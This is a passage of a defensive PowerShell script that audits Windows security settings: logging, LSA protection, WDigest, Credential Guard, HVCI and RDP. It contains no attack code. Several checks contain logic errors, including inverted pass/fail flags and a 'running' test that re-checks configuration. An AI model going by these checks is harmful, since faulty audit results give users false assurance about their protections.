        # If the Category/Subcategory field starts with two blanks, it is a
        # subcategory entry - else a category entry.
        if ($csvAuditCategory.'GUID' -like '{*-797A-11D9-BED3-505054503030}')
        {
            $lastCategory     = $csvAuditCategory.'Kategorie/Unterkategorie'
            $lastCategoryGuid = $csvAuditCategory.GUID
        }
        else
        {
            $csvAuditSetting = $csvAuditSettings | Where-Object { $_.'Unterkategorie-GUID' -eq $csvAuditCategory.GUID }

            
            #Write-Host "DE"
            # Return the result object
            [PSCustomObject] @{
                PSTypeName      = 'SecurityFever.AuditPolicy'
                ComputerName    = $csvAuditSetting.'Computername'
                Category        = $lastCategory
                CategoryGuid    = $lastCategoryGuid
                Subcategory     = $csvAuditSetting.'Unterkategorie'
                SubcategoryGuid = $csvAuditSetting.'Unterkategorie-GUID'
                AuditSuccess    = $csvAuditSetting.'Aufnahmeeinstellung' -like '*Erfolg*'
                AuditFailure    = $csvAuditSetting.'Aufnahmeeinstellung' -like '*Fehler*'
            }
        }
            
    }
    
}

function Get-SecurityAuditPolicy
{
    [CmdletBinding()]
    param ()

    # Use the helper functions to execute the auditpol.exe queries.
    $csvAuditCategories = Invoke-AuditPolListSubcategoryAllCsv | ConvertFrom-Csv
    $csvAuditSettings   = Invoke-AuditPolGetCategoryAllCsv | ConvertFrom-Csv

    foreach ($csvAuditCategory in $csvAuditCategories)
    {
        # If the Category/Subcategory field starts with two blanks, it is a
        # subcategory entry - else a category entry.
        if ($csvAuditCategory.'GUID' -like '{*-797A-11D9-BED3-505054503030}')
        {
            $lastCategory     = $csvAuditCategory.'Category/Subcategory'
            $lastCategoryGuid = $csvAuditCategory.GUID
        }
        else
        {
            $csvAuditSetting = $csvAuditSettings | Where-Object { $_.'Subcategory GUID' -eq $csvAuditCategory.GUID }

            # Return the result object
            [PSCustomObject] @{
                PSTypeName      = 'SecurityFever.AuditPolicy'
                ComputerName    = $csvAuditSetting.'Machine Name'
                Category        = $lastCategory
                CategoryGuid    = $lastCategoryGuid
                Subcategory     = $csvAuditSetting.'Subcategory'
                SubcategoryGuid = $csvAuditSetting.'Subcategory GUID'
                AuditSuccess    = $csvAuditSetting.'Inclusion Setting' -like '*Success*'
                AuditFailure    = $csvAuditSetting.'Inclusion Setting' -like '*Failure*'
            }
        }
    }
}

function Invoke-AuditPolGetCategoryAllCsv
{
    [CmdletBinding()]
    param ()

    (auditpol.exe /get /category:* /r) |
        Where-Object { -not [String]::IsNullOrEmpty($_) }
}

function Invoke-AuditPolListSubcategoryAllCsv
{
    [CmdletBinding()]
    param ()

    (auditpol.exe /list /subcategory:* /r) |
        Where-Object { -not [String]::IsNullOrEmpty($_) }
}
function Add-SecurityCheckItem {
    <#
    .SYNOPSIS
    Creates a new security check item and adds it to a global array.
    Author: Michael Ritter
    License: BSD 3-Clause
    .DESCRIPTION
    Single Security Checks that cannot be exported as CSV need to be collected centrally
    .PARAMETER SecurityItem
    Specifies the desired name for the security item group. (i.e. Microsoft PowerShell)
    .PARAMETER SecurityItemCheck
    Specifies the desired name for the specific check
    .PARAMETER AuditCheckResult
    Specifies the result of the check
    .PARAMETER AuditCheckPass
    Specifies if the security check was successful or not
    .EXAMPLE
    $result = "PowerShell v$($($PSVersionTable.PSVersion).Major) is installed and starts by default, important security features are shipped with this version" 
    Add-SecurityCheckItem -SecurityItem "PowerShell Version" -SecurityItemCheck "Check if at least PowerShell version 5 is in use" -AuditCheckResult $result -AuditCheckPass $true
    
    #>
    param (
        [Parameter(Position = 0, Mandatory=$True)]
        [String] $SecurityItem,
        [Parameter(Position = 1, Mandatory=$True)]
        [String] $SecurityItemCheck,
        [Parameter(Position = 2, Mandatory=$True)]
        [String] $AuditCheckResult,
        [Parameter(Position = 3, Mandatory=$True)]
        [Bool] $AuditCheckPass
    )
        $SecurityItemAuditResults = @()
        $auditDetails = @{
            SecurityItem    = $SecurityItem
            Check     = $SecurityItemCheck
            Result      = $AuditCheckResult
            Passed = $AuditCheckPass
        } 
    
       [array]$Global:SecurityItemAuditResults += New-Object PSObject -Property $auditDetails
    }
    
$path = ".\CSV"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}

# Settings CSV
$SecurityItemAuditResults = @()

####################### PowerShell Version ###################################################
Write-Host '#########################' -BackgroundColor Black
Write-Host '## PowerShell Version  ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
$strSecurityItem = "PowerShell Version"
$strSecurityItemCheck = "PowerShell version should be at least 5"

Write-Host 'Checking the version used by default' -ForegroundColor Black -BackgroundColor White

if(($PSVersionTable.PSVersion).Major -ge 5){
    $strAuditCheckResult="PowerShell v$($($PSVersionTable.PSVersion).Major) is installed and starts by default, important security features are shipped with this version"
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
} else {
    $strAuditCheckResult="PowerShell v$($($PSVersionTable.PSVersion).Major) is installed and starts by default, important security features are missing in this version"
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
}


$strSecurityItem = "PowerShell Version"
$strSecurityItemCheck = "PowerShell version 2 should be disabled"
Write-Host 'Checking if PowerShellv2 is installed' -ForegroundColor Black -BackgroundColor White

if(((Get-WindowsOptionalFeature -Online | Where-Object {$_.FeatureName -match "PowerShellv2"}).State) -eq "Enabled"){
    $strAuditCheckResult='PowerShell v2 is still enabled'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
} else {
    $strAuditCheckResult='PowerShell v2 is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
}

####################### PowerShell Module Logging ###################################################
$strSecurityItem = "PowerShell - Module Logging"
$strSecurityItemCheck = "PowerShell Module Logging should be enabled"
Write-Host '####################' -BackgroundColor Black
Write-Host '## Module Logging ##' -BackgroundColor Black
Write-Host '####################' -BackgroundColor Black
Write-Host 'Checking if PowerShell Module Logging is enabled' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
$regPathProperty = "EnableModuleLogging"

if(Test-Path -Path $regPath)
{
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Module Logging is enabled'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
            Write-Host 'The following module names will be logged' -ForegroundColor Black -BackgroundColor White          
            Get-ChildItem -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging\" | Format-Table Property

         }
         '0' 
         {
             $strAuditCheckResult='Module Logging is disabled'
             Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
             Write-Host $strAuditCheckResult -ForegroundColor Red
         }
     }
}
else{
         $strAuditCheckResult='Module Logging is disabled'
         Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         Write-Host $strAuditCheckResult -ForegroundColor Red    
}

####################### PowerShell - Script Block Logging ###################################################
$strSecurityItem = "PowerShell - Script Block Logging"
$strSecurityItemCheck = "PowerShell Script Block Logging should be enabled"
Write-Host '##########################' -BackgroundColor Black
Write-Host '## Script Block Logging ##' -BackgroundColor Black
Write-Host '##########################' -BackgroundColor Black
Write-Host 'Checking if PowerShell Script Block Logging is enabled' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
$regPathProperty = "EnableScriptBlockLogging"

if(Test-Path -Path $regPath)
{
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue

    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Script Block Logging is enabled'
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
            Write-Host $strAuditCheckResult -ForegroundColor Green
         }
         '0' 
         {
            $strAuditCheckResult='Script Block Logging is disabled'
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
            Write-Host $strAuditCheckResult -ForegroundColor Red
         }
     }
}
else{
        $strAuditCheckResult='Script Block Logging is disabled'
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
        Write-Host $strAuditCheckResult -ForegroundColor Red
}

####################### PowerShell - Transcript Logging ###################################################
$strSecurityItem = "PowerShell - Transcript Logging"
$strSecurityItemCheck = "PowerShell Transcript Logging should be enabled"
Write-Host '#########################' -BackgroundColor Black
Write-Host '## Transcript Logging  ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Checking if PowerShell Transcript Logging is enabled' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription"
$regPathProperty = "EnableTranscripting"

if(Test-Path -Path $regPath)
{
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue

    Switch($check)
    {
         '1' 
         {
             ## Enabled
             $strAuditCheckResult='Transcript Logging is enabled'
             Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
             Write-Host $strAuditCheckResult -ForegroundColor Green

             ## Check Invocation Header
             $strSecurityItemCheck = "PowerShell Transcript Logging - Invocation Header should be set"
             $regPathProperty = "EnableInvocationHeader"
             if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
                
                $strAuditCheckResult='Invocation Header is set '
                Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
                Write-Host $strAuditCheckResult -ForegroundColor Green

             } else {

                $strAuditCheckResult='Invocation Header is not set '
                Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
                Write-Host $strAuditCheckResult -ForegroundColor Red

             }

             ## Output Directory
             $strSecurityItemCheck = "PowerShell Transcript Logging - An output directory should be set"
             $regPathProperty = "OutputDirectory"
             if((Test-RegistryValue -Path $regPath -Name $regPathProperty)) {
                
                'Output Directory is set to:'
                $outputDirectory=(Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription\" -Name "OutputDirectory").OutputDirectory
                if(([string]::IsNullOrEmpty($outputDirectory))){
                    $strAuditCheckResult='(Default) Windows PowerShell will record transcript output to each users My Documents directory '
                    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
                    Write-Host $strAuditCheckResult -ForegroundColor Yellow
                    
                } else {
                    $strAuditCheckResult="Output Directory: $($outputDirectory)"
                    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
                    Write-Host $strAuditCheckResult -ForegroundColor Green
                }

             } else {
                $strAuditCheckResult='Output Directory is not set'
                Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
                Write-Host $strAuditCheckResult -ForegroundColor Red
             }

         }
         '0' 
         {
            $strSecurityItemCheck = "PowerShell Transcript Logging should be enabled"
            $strAuditCheckResult='Transcript Logging is disabled '
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
            Write-Host $strAuditCheckResult -ForegroundColor Red
         }
     }
}
else
{
         $strAuditCheckResult='Transcript Logging is disabled '
         Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         Write-Host $strAuditCheckResult -ForegroundColor Red
}

####################### PowerShell - Language Mode ###################################################
$strSecurityItem = "PowerShell - Language Mode"
$strSecurityItemCheck = "PowerShell Constrained Language Mode should be active"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##    Language Mode    ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Checking if ConstrainedLanguage Mode is active' -ForegroundColor Black -BackgroundColor White
Switch($ExecutionContext.SessionState.LanguageMode)
{
        'FullLanguage' 
        {
            $strAuditCheckResult='Constrained Language Mode is not active'
            Write-Host  $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
        }
        'ConstrainedLanguage' 
        {
            $strAuditCheckResult = 'Constrained Language Mode is active'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
        }
    }

####################### Sysmon ###################################################
$strSecurityItem = "Logging - Sysmon" # TODO
$strSecurityItemCheck = "Sysmon should be installed and configured"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##       Sysmon        ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Checking if Sysmon is installed' -ForegroundColor Black -BackgroundColor White
Test-SysmonInstalled

####################### LSA Protection ###################################################
$strSecurityItem = "Credential Theft - LSA Protection"
$strSecurityItemCheck = "LSA Protection should be enabled"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##    LSA Protection   ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Checking if LSA Protection is enabled' -ForegroundColor Black -BackgroundColor White
## LSA Protection
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$regPathProperty = "RunAsPPL"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='LSA Protection is enabled'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='LSA Protection is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='LSA Protection is disabled'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

 ####################### LM Hashes ###################################################
$strSecurityItem = "Credential Theft - LM Hashes"
$strSecurityItemCheck = "Storing LM Hashes should be prevented"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##      LM Hashes      ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Checking if LM Hashes can be stored' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\\\SYSTEM\CurrentControlSet\Control\Lsa\"
$regPathProperty = "NoLMHash"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='LM Hashes are not stored'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
         }
         '0' 
         {
            $strAuditCheckResult='LM Hashes are stored'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
    $strAuditCheckResult='LM Hashes are stored'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

####################### WDigest ###################################################
# https://www.praetorian.com/blog/mitigating-mimikatz-wdigest-cleartext-credential-theft/
$strSecurityItem = "Credential Theft - WDigest"
$strSecurityItemCheck = "WDigest should be disabled"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##        WDigest      ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Checking if WDigest is enabled' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
$regPathProperty = "UseLogonCredential"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='WDigest is enabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
         '0' 
         {
            $strAuditCheckResult='WDigest is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
         }
     }
 } else {
    $strAuditCheckResult='WDigest is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 }

####################### AppLocker ###################################################
Write-Host '#########################' -BackgroundColor Black
Write-Host '##       AppLocker     ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black

Write-Host 'Checking if Applocker Policy' -ForegroundColor Black -BackgroundColor White
Get-AppLockerPolicy -Effective | Format-List
Write-Host 'Exporting AppLocker Policy to CSV' -ForegroundColor Black -BackgroundColor White
Get-AppLockerPolicy -Effective -Xml | Set-Content ('.\applocker.xml') 

#PS C:\> (Get-AppLockerPolicy -Local).RuleCollections
#PS C:\> Get-AppLockerPolicy -Effective -Xml
#PS C:\> Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
#PS C:\> Get-AppLockerPolicy -Domain -LDAP "LDAP:// DC13.Contoso.com/CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=Contoso,DC=com

####################### Device Guard ###################################################
$strSecurityItem = "Credential Theft - Device Guard" # TODO
Write-Host '#########################' -BackgroundColor Black
Write-Host '##     Device Guard    ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black


if(((Get-CSDeviceGuardStatus).AvailableSecurityProperties) -contains "BaseVirtualizationSupport"){
    Write-Host "BaseVirtualizationSupport is available, checking if configured ..."  -ForegroundColor Black -BackgroundColor White
} else { Write-Host "BaseVirtualizationSupport is not available" -ForegroundColor DarkGray -BackgroundColor white }

if(((Get-CSDeviceGuardStatus).AvailableSecurityProperties) -contains "SecureBoot"){
    Write-Host "SecureBoot is available, checking if configured ..."  -ForegroundColor Black -BackgroundColor White
} else { Write-Host "SecureBoot is not available" -ForegroundColor DarkGray -BackgroundColor white }

if(((Get-CSDeviceGuardStatus).AvailableSecurityProperties) -contains "DMAProtection"){
    Write-Host "DMAProtection is available, checking if configured ..." -ForegroundColor Black -BackgroundColor White
} else { Write-Host "DMAProtection is not available"  -ForegroundColor DarkGray -BackgroundColor white}

if(((Get-CSDeviceGuardStatus).AvailableSecurityProperties) -contains "SecureMemoryOverwrite"){
    Write-Host "SecureMemoryOverwrite is available, checking if configured ..." -ForegroundColor Black -BackgroundColor White
} else { Write-Host "SecureMemoryOverwrite is not available" -ForegroundColor DarkGray -BackgroundColor white }

if(((Get-CSDeviceGuardStatus).AvailableSecurityProperties) -contains "UEFICodeReadOnly"){
    Write-Host "UEFICodeReadOnly is available, checking if configured ..." -ForegroundColor Black -BackgroundColor White
} else { Write-Host "UEFICodeReadOnly is not available" -ForegroundColor DarkGray -BackgroundColor white }

if(((Get-CSDeviceGuardStatus).AvailableSecurityProperties) -contains "SMMSecurityMitigations1.0"){
    Write-Host "SMMSecurityMitigations1.0 is available, checking if configured ..." -ForegroundColor Black -BackgroundColor White
} else { Write-Host "SMMSecurityMitigations1.0 is not available" -ForegroundColor DarkGray -BackgroundColor white }

$strSecurityItem = "Credential Theft - Credential Guard"
# Check if CredentialGuard is configured
if(((Get-CSDeviceGuardStatus).SecurityServicesConfigured) -contains "CredentialGuard"){
    $strSecurityItemCheck = "Credential Guard must be configured"
    $strAuditCheckResult="Credential Guard is configured"
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

    #Check if CredentialGuard  is running
    if(((Get-CSDeviceGuardStatus).SecurityServicesConfigured) -contains "CredentialGuard"){
        $strSecurityItemCheck = "Credential Guard must be running"
        $strAuditCheckResult="Credential Guard is running"
        Write-Host $strAuditCheckResult -ForegroundColor Green
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
    } else { 
        $strSecurityItemCheck = "Credential Guard must be running"
        $strAuditCheckResult="Credential Guard is not running"
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
    }
} else { 
    $strSecurityItemCheck = "Credential Guard must be configured"
    $strAuditCheckResult="Credential Guard is not configured"
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
}


# Check if HVCI is configured
if(((Get-CSDeviceGuardStatus).SecurityServicesConfigured) -contains "HypervisorEnforcedCodeIntegrity"){
    $strSecurityItemCheck = "Virtualization-based protection of code must be configured"
    $strAuditCheckResult="Virtualization-based protection of code integrity is configured"
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
    
    #Check if HVCI is running
    
    if(((Get-CSDeviceGuardStatus).SecurityServicesRunning) -contains "HypervisorEnforcedCodeIntegrity"){
        $strSecurityItemCheck = "Virtualization-based protection of code must be running"    
        $regPath = "HKLM:\\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard\"
        $regPathProperty = HypervisorEnforcedCodeIntegrity
        
        if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
            $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
            Switch($check)
            {
                '1' 
                {
                    $strSecurityItemCheck = "Virtualization-based protection of code integrity must be running with UEFI lock enabled" 
                    $strAuditCheckResult='Virtualization-based protection of code integrity is running with UEFI lock enabled'
                    Write-Host $strAuditCheckResult -ForegroundColor Green
                    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
                }
                '0' 
                {
                    $strSecurityItemCheck = "Virtualization-based protection of code integrity must be running with UEFI lock enabled" 
                    $strAuditCheckResult='Virtualization-based protection of code integrity is running without UEFI lock'
                    Write-Host $strAuditCheckResult -ForegroundColor Red
                    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
                }
            }
        } else {
            $strSecurityItemCheck = "Virtualization-based protection of code integrity must be running with UEFI lock enabled" 
            $strAuditCheckResult='Virtualization-based protection of code integrity is running with UEFI lock enabled'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
        }
        Write-Host "Virtualization-based protection of code integrity is running" -ForegroundColor Green
        
        #UsermodeCodeIntegrityPolicyEnforcementStatus
        $strSecurityItemCheck = "Code Integrity Policy Enforcement Status (Usermode) must be set to Enforcement Mode"
        if(((Get-CSDeviceGuardStatus).UsermodeCodeIntegrityPolicyEnforcementStatus) -match "AuditMode"){
            $strAuditCheckResult="Code Integrity Policy Enforcement Status (Usermode) is set to Audit Mode"
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
        } elseif(((Get-CSDeviceGuardStatus).UsermodeCodeIntegrityPolicyEnforcementStatus) -match "EnforcementMode"){
            $strAuditCheckResult="Code Integrity Policy Enforcement Status (Usermode) is set to Enforcement Mode"
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
        } else { 
            $strAuditCheckResult="Code Integrity Policy Enforcement Status (Usermode) is set to Off"
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
        }

        #CodeIntegrityPolicyEnforcementStatus
        $strSecurityItemCheck = "Code Integrity Policy Enforcement Status must be set to Enforcement Mode"
        if(((Get-CSDeviceGuardStatus).CodeIntegrityPolicyEnforcementStatus) -match "AuditMode"){
            $strAuditCheckResult="Code Integrity Policy Enforcement Status is set to Audit Mode"
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
        } elseif(((Get-CSDeviceGuardStatus).CodeIntegrityPolicyEnforcementStatus) -match "EnforcementMode"){
            $strAuditCheckResult="Code Integrity Policy Enforcement Status is set to EnforcementMode"
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
        } else { 
            $strAuditCheckResult="Code Integrity Policy Enforcement Status is set to Off"
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
        }


    } else { 
        $strSecurityItemCheck = "Virtualization-based protection of code must be running"
        $strAuditCheckResult =  "Virtualization-based protection of code integrity is not running"
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
    }
} else { 
    $strSecurityItemCheck = "Virtualization-based protection of code must be configured"
    $strAuditCheckResult="Virtualization-based protection of code integrity is not configured"
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
}

####################### RDP ###################################################
$strSecurityItem = "Windows Services - RDP"
$strSecurityItemCheck = "RDP should be disabled"
Write-Host '#########################' -BackgroundColor Black
Write-Host '##          RDP        ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Checking if RDP is disabled' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\\System\CurrentControlSet\Control\Terminal Server\"
$regPathProperty = "fDenyTSConnections"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
